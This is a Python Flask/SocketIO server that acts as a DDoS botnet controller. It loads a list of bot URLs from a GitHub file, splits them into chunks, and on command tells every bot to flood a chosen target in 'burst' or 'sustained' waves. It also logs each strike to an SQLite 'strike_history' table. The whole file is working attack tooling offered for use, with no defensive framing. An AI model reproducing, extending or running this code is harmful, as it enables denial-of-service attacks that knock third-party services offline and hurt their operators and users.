import os
import asyncio
import aiohttp
import httpx
import sqlite3
import time
import threading
import secrets
from flask import Flask, request
from flask_socketio import SocketIO, emit
from datetime import datetime

# ---------- ENVIRONMENT ----------
GITHUB_BOT_URL = os.getenv("BOT_LIST_URL", "https://raw.githubusercontent.com/nkarthikraja-32/bot/main/bots.txt")
CHUNK_INDEX = int(os.getenv("CHUNK_INDEX", "0"))
TOTAL_CHUNKS = int(os.getenv("TOTAL_CHUNKS", "3"))
MAX_CONNECTIONS = int(os.getenv("MAX_CONNECTIONS", "500"))
PORT = int(os.getenv("PORT", "80"))
DB_NAME = f"backend_{CHUNK_INDEX}.db"

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

BOT_ARMY = []
attack_counter = 0
active_attacks = {}      # attack_id -> {'event': Event, 'info': dict}

# -------- DATABASE (optional, for local history) ----------
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS strike_history
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       target TEXT,
                       duration INTEGER,
                       method TEXT,
                       timestamp TEXT,
                       success_rate TEXT,
                       nodes_used INTEGER)''')
init_db()

# -------- BOT LOADING (chunking) ----------
def load_bots():
    global BOT_ARMY
    try:
        r = httpx.get(GITHUB_BOT_URL, timeout=10)
        r.raise_for_status()
        all_bots = [line.strip() for line in r.text.splitlines() if line.strip().startswith("http")]
        chunk_size = len(all_bots) // TOTAL_CHUNKS
        start = CHUNK_INDEX * chunk_size
        end = start + chunk_size if CHUNK_INDEX < TOTAL_CHUNKS - 1 else len(all_bots)
        BOT_ARMY = all_bots[start:end]
        return len(BOT_ARMY)
    except Exception as e:
        print(f"Backend {CHUNK_INDEX}: bot load error: {e}")
        return 0

# -------- ATTACK ENGINES ----------
async def execute_attack(target, duration, method):
    global attack_counter
    if not BOT_ARMY:
        socketio.emit('log', {'m': "⚠️ ERROR: No bots loaded."})
        load_bots()
        if not BOT_ARMY:
            socketio.emit('log', {'m': "💀 CRITICAL: Still no bots."})
            return

    attack_counter += 1
    attack_id = attack_counter
    stop_event = threading.Event()
    active_attacks[attack_id] = {
        'event': stop_event,
        'info': {
            'id': attack_id,
            'backend': CHUNK_INDEX,
            'target': target,
            'duration': duration,
            'method': method,
            'start_time': datetime.now().strftime("%H:%M:%S"),
            'status': 'running'
        }
    }
    socketio.emit('active_attacks', get_active())
    socketio.emit('log', {'m': f"⚔️ BACKEND {CHUNK_INDEX} ATTACK #{attack_id}: {target} | {method} | {duration}s | Bots: {len(BOT_ARMY)}"})

    try:
        if method == 'burst':
            await execute_burst(target, duration, stop_event)
        elif method == 'sustained':
            await execute_sustained(target, duration, stop_event)
    finally:
        if attack_id in active_attacks:
            active_attacks[attack_id]['info']['status'] = 'finished'
            socketio.emit('active_attacks', get_active())
            del active_attacks[attack_id]

def get_active():
    return [v['info'] for v in active_attacks.values()]

async def execute_sustained(target, duration, stop_event):
    start_ts = time.time()
    wave_count = 0
    total_success = 0

    connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS, force_close=False)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=4, connect=2)) as session:
        sem = asyncio.Semaphore(MAX_CONNECTIONS)

        async def call_one(url):
            if stop_event.is_set():
                return False
            params = {"url": target, "duration": 5}
            try:
                async with sem, session.get(url, params=params) as resp:
                    return True
            except:
                return False

        while time.time() - start_ts < duration and not stop_event.is_set():
            wave_start = time.time()
            urls = BOT_ARMY
            success = [False] * len(urls)
            tasks = [call_one(u) for u in urls]
            first = await asyncio.gather(*tasks)
            for i, ok in enumerate(first):
                success[i] = ok
            # retry up to 2x within 5s
            for retry_round in range(2):
                failed = [i for i, ok in enumerate(success) if not ok]
                if not failed or time.time() - wave_start > 4.8:
                    break
                retry_tasks = [call_one(urls[i]) for i in failed]
                retry_res = await asyncio.gather(*retry_tasks)
                for idx, r in zip(failed, retry_res):
                    success[idx] = r
            wave_success = sum(success)
            total_success += wave_success
            wave_count += 1
            socketio.emit('log', {'m': f"✅ BACKEND {CHUNK_INDEX} WAVE {wave_count}: {wave_success}/{len(urls)} bots"})
            elapsed = time.time() - wave_start
            if elapsed < 5:
                await asyncio.sleep(5 - elapsed)

    exec_time = round(time.time() - start_ts, 2)
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute("INSERT INTO strike_history (target,duration,method,timestamp,success_rate,nodes_used) VALUES (?,?,?,?,?,?)",
                     (target, duration, "sustained", datetime.now().strftime("%H:%M:%S"),
                      f"{total_success}/{len(BOT_ARMY)*wave_count}", len(BOT_ARMY)))
        conn.commit()
    socketio.emit('log', {'m': f"🏁 BACKEND {CHUNK_INDEX} SUSTAINED COMPLETE: {wave_count} waves, {total_success} hits"})

async def execute_burst(target, duration, stop_event):
    start_ts = time.time()
    burst_count = 0
    total_success = 0

    connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS, force_close=False)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=4, connect=2)) as session:
        sem = asyncio.Semaphore(MAX_CONNECTIONS)

        async def call_one(url):
            if stop_event.is_set():
                return False
            params = {"url": target, "duration": 8}
            try:
                async with sem, session.get(url, params=params) as resp:
                    return True
            except:
                return False

        while time.time() - start_ts < duration and not stop_event.is_set():
            burst_count += 1
            socketio.emit('log', {'m': f"💥 BACKEND {CHUNK_INDEX} BURST #{burst_count} launched"})
            urls = BOT_ARMY
            tasks = [call_one(u) for u in urls]
            results = await asyncio.gather(*tasks)
            success = sum(1 for r in results if r)
            total_success += success
            socketio.emit('log', {'m': f"✅ BURST #{burst_count}: {success}/{len(urls)}"})
            if time.time() - start_ts < duration:
                await asyncio.sleep(8)

    exec_time = round(time.time() - start_ts, 2)
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute("INSERT INTO strike_history (target,duration,method,timestamp,success_rate,nodes_used) VALUES (?,?,?,?,?,?)",
                     (target, duration, "burst", datetime.now().strftime("%H:%M:%S"),
                      f"{total_success}/{len(BOT_ARMY)*burst_count}", len(BOT_ARMY)))
        conn.commit()
    socketio.emit('log', {'m': f"🏁 BACKEND {CHUNK_INDEX} BURST COMPLETE: {burst_count} bursts, {total_success} hits"})

# -------- SOCKET EVENTS ----------
@socketio.on('connect')
def on_connect():
    socketio.emit('log', {'m': f"Backend {CHUNK_INDEX} connected to frontend."})

@socketio.on('sync')
def handle_sync():
    count = load_bots()
    socketio.emit('bot_count', {'backend': CHUNK_INDEX, 'count': count})
    socketio.emit('log', {'m': f"Backend {CHUNK_INDEX} synced: {count} bots ready."})

@socketio.on('start_attack')
def handle_start(data):
    target = data.get('target')
    duration = int(data.get('duration', 60))
    method = data.get('method', 'sustained')
    threading.Thread(target=lambda: asyncio.run(execute_attack(target, duration, method))).start()

@socketio.on('stop_attack')
def handle_stop(data):
    attack_id = data.get('attack_id')
    if attack_id and attack_id in active_attacks:
        active_attacks[attack_id]['event'].set()
        socketio.emit('log', {'m': f"🛑 Backend {CHUNK_INDEX}: Stop signal sent for attack #{attack_id}."})
    else:
        socketio.emit('log', {'m': f"⚠️ Attack #{attack_id} not found."})

if __name__ == '__main__':
    load_bots()
    socketio.run(app, host='0.0.0.0', port=PORT, allow_unsafe_werkzeug=True)
